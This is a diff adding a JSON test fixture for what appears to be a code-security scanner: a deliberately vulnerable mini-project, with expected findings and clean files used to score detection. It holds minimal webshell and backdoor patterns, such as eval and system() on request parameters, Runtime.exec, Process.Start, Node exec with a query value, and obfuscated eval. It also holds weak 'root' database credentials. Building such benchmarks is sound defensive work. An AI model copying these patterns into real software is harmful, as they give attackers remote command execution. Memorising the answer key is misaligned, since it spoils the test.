@@ -1,0 +1,163 @@
+{
+  "_about": "A tiny, deliberately vulnerable project used only to measure what the gate finds. It is stored as JSON so that this repository's own scans and GitHub code scanning do not report it. benchmark/run_lab.py writes it to a temporary folder and scans it there. Never deploy it. Files listed under \"clean\" are safe code: any finding on them (matching rule_hint, or any finding when rule_hint is empty) counts as a false positive. Every malicious sample is a minimal, synthetic and inert pattern written for this lab (the encoded strings decode to harmless text such as INERT); none is copied from a real webshell.",
+  "files": {
+    "index.php": "<?php\nrequire 'includes/functions.php';\necho render_home();\n",
+    "includes/functions.php": "<?php\nfunction render_home() { return 'home'; }\n@eval(gzinflate(base64_decode('SU5FUlQ=')));\n",
+    "wp-content/uploads/2023/05/cache.php": "<?php /* INERT LAB SAMPLE */ if (isset($_REQUEST['k'])) { eval($_REQUEST['k']); }\n",
+    "admin/tools.php": "<?php\n// INERT LAB SAMPLE\nsystem($_GET['cmd']);\n",
+    "lib/loader.php": "<?php\n$_GET['f']($_POST['a']);\n",
+    "old/filter.php": "<?php\n$out = preg_replace('/(.*)/e', $_POST['r'], $in);\n",
+    "images/banner.jpg": "GIF89a INERT LAB SAMPLE <?php echo 'x'; ?>\n",
+    "assets/js/analytics.js": "(function(){ eval(atob('Y29uc29sZS5sb2coIklORVJUIik=')); })();\n",
+    "node/server.js": "const { exec } = require('child_process');\napp.get('/ping', (req, res) => { exec('ping -c 1 ' + req.query.host, () => res.end()); });\n",
+    "jsp/status.jsp": "<% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>\n",
+    "aspx/upload.aspx": "<%@ Page Language=\"C#\" %>\n<% System.Diagnostics.Process.Start(\"cmd.exe\", \"/c \" + Request.QueryString[\"c\"]); %>\n",
+    "py/hook.py": "import base64\nexec(base64.b64decode('cHJpbnQoIklORVJUIik='))\n",
+    "lib/blob.php": "<?php\n$p = 'SU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRB';\n",
+    "db.php": "<?php\n$link = mysql_connect('localhost', 'shop', getenv('DB_PASS'));\n$name = utf8_encode($row['name']);\n",
+    "config.php": "<?php\n$db_user = 'root';\n$db_pass = 'root';\n",
+    "adminer.php": "<?php /* INERT LAB SAMPLE: stands in for a forgotten Adminer copy */\n",
+    "public_html/backup/site-2019.sql.txt": "-- INERT LAB SAMPLE\n",
+    "public_html/index.php": "<?php\nrequire '../index.php';\n",
+    "wp-content/uploads/index.php": "<?php\n// Silence is golden.\n",
+    "app/Http/Controllers/PostController.php": "<?php\nnamespace App\\Http\\Controllers;\nuse Illuminate\\Support\\Facades\\DB;\nclass PostController extends Controller {\n    public function index(Request $request) {\n        $data = $request->validate(['q' => 'nullable|string|max:50']);\n        $rows = DB::select('select * from posts where title like ?', ['%'.($data['q'] ?? '').'%']);\n        collect($rows)->each(fn ($r) => logger()->info($r->id));\n        return view('posts.index', ['rows' => $rows]);\n    }\n}\n",
+    "src/main/java/app/HealthController.java": "package app;\n@RestController\npublic class HealthController {\n    @GetMapping(\"/version\")\n    public String version() throws Exception {\n        Process p = new ProcessBuilder(\"git\", \"rev-parse\", \"HEAD\").start();\n        return new String(p.getInputStream().readAllBytes());\n    }\n}\n",
+    "web/app.js": "const express = require('express');\nconst app = express();\napp.get('/page', (req, res) => {\n  const ok = /^\\d+$/.exec(req.query.page);\n  res.json({ ok: !!ok });\n});\n",
+    "public/index.php": "<?php\nrequire __DIR__.'/../vendor/autoload.php';\n",
+    "public/css/app.css.js": "export const bg = 'url(data:image/png;base64,SU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRBSU5FUlQgVEVTVCBEQVRB)';\n"
+  },
+  "expected": [
+    {
+      "id": "G1",
+      "what": "Obfuscated eval(gzinflate(base64_decode())) injected into an include",
+      "file": "includes/functions.php",
+      "rule_hint": "WEBSHELL_OBFUSCATED_EVAL"
+    },
+    {
+      "id": "G2",
+      "what": "Webshell in the uploads folder",
+      "file": "wp-content/uploads/2023/05/cache.php",
+      "rule_hint": "PHP_IN_UPLOAD_DIR"
+    },
+    {
+      "id": "G3",
+      "what": "eval of a request value",
+      "file": "wp-content/uploads/2023/05/cache.php",
+      "rule_hint": "BACKDOOR_REQUEST_EXEC"
+    },
+    {
+      "id": "G4",
+      "what": "system() on $_GET",
+      "file": "admin/tools.php",
+      "rule_hint": "BACKDOOR_REQUEST_EXEC"
+    },
+    {
+      "id": "G5",
+      "what": "Request chooses the function: $_GET['f'](...)",
+      "file": "lib/loader.php",
+      "rule_hint": "REQUEST_DYNAMIC_CALL"
+    },
+    {
+      "id": "G6",
+      "what": "preg_replace with /e",
+      "file": "old/filter.php",
+      "rule_hint": "PREG_REPLACE_EVAL"
+    },
+    {
+      "id": "G7",
+      "what": "PHP code inside an image",
+      "file": "images/banner.jpg",
+      "rule_hint": "PHP_IN_IMAGE_FILE"
+    },
+    {
+      "id": "G8",
+      "what": "eval(atob()) in front-end JS",
+      "file": "assets/js/analytics.js",
+      "rule_hint": "WEBSHELL_OBFUSCATED_EVAL"
+    },
+    {
+      "id": "G9",
+      "what": "Node exec with req.query",
+      "file": "node/server.js",
+      "rule_hint": "BACKDOOR_REQUEST_EXEC"
+    },
+    {
+      "id": "G10",
+      "what": "JSP Runtime.exec on a request parameter",
+      "file": "jsp/status.jsp",
+      "rule_hint": "BACKDOOR_REQUEST_EXEC"
+    },
+    {
+      "id": "G11",
+      "what": "ASPX Process.Start with Request.QueryString",
+      "file": "aspx/upload.aspx",
+      "rule_hint": "BACKDOOR_REQUEST_EXEC"
+    },
+    {
+      "id": "G12",
+      "what": "Python exec(b64decode())",
+      "file": "py/hook.py",
+      "rule_hint": "WEBSHELL_OBFUSCATED_EVAL"
+    },
+    {
+      "id": "G13",
+      "what": "Long base64 blob in code",
+      "file": "lib/blob.php",
+      "rule_hint": "SUSPICIOUS_OBFUSCATION"
+    },
+    {
+      "id": "G14",
+      "what": "Removed mysql_* API and deprecated utf8_encode",
+      "file": "db.php",
+      "rule_hint": "PHP_DEPRECATED_API"
+    },
+    {
+      "id": "G15",
+      "what": "Database password 'root' in config.php",
+      "file": "config.php",
+      "rule_hint": "WEAK_DEFAULT_CREDENTIAL"
+    },
+    {
+      "id": "G16",
+      "what": "Forgotten adminer.php",
+      "file": "adminer.php",
+      "rule_hint": "EXPOSED_ADMIN_TOOL"
+    },
+    {
+      "id": "G17",
+      "what": "backup folder inside the web root",
+      "file": "public_html/backup",
+      "rule_hint": "SENSITIVE_WEBROOT_PATH"
+    }
+  ],
+  "clean": [
+    {
+      "file": "index.php",
+      "rule_hint": "WEBSHELL|BACKDOOR|REQUEST_DYNAMIC|PREG_REPLACE|PHP_IN_|SUSPICIOUS"
+    },
+    {
+      "file": "wp-content/uploads/index.php",
+      "rule_hint": "WEBSHELL|BACKDOOR|REQUEST_DYNAMIC|PREG_REPLACE|PHP_IN_|SUSPICIOUS"
+    },
+    {
+      "file": "app/Http/Controllers/PostController.php",
+      "rule_hint": "WEBSHELL|BACKDOOR|REQUEST_DYNAMIC|PREG_REPLACE|PHP_IN_|SUSPICIOUS"
+    },
+    {
+      "file": "src/main/java/app/HealthController.java",
+      "rule_hint": "WEBSHELL|BACKDOOR|REQUEST_DYNAMIC|PREG_REPLACE|PHP_IN_|SUSPICIOUS"
+    },
+    {
+      "file": "web/app.js",
+      "rule_hint": "WEBSHELL|BACKDOOR|REQUEST_DYNAMIC|PREG_REPLACE|PHP_IN_|SUSPICIOUS"
+    },
+    {
+      "file": "public/index.php",
+      "rule_hint": "WEBSHELL|BACKDOOR|REQUEST_DYNAMIC|PREG_REPLACE|PHP_IN_|SUSPICIOUS"
+    },
+    {
+      "file": "public/css/app.css.js",
+      "rule_hint": "WEBSHELL|BACKDOOR|REQUEST_DYNAMIC|PREG_REPLACE|PHP_IN_|SUSPICIOUS"
+    }
+  ]
+}
